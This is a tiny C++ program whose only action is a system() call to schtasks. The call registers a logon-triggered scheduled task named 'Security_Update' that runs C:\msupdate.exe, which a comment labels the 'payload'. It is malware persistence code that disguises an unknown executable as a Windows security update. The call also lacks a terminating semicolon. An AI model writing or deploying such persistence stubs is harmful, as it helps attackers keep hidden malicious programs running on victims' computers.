#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>

int main ()
{
    //payload path is C:\msupdate.exe
    
    system("C:\\WINDOWS\\system32\\schtasks.exe /create /SC ONLOGON /TR 'C:\\msupdate.exe' /TN 'Security_Update'")
}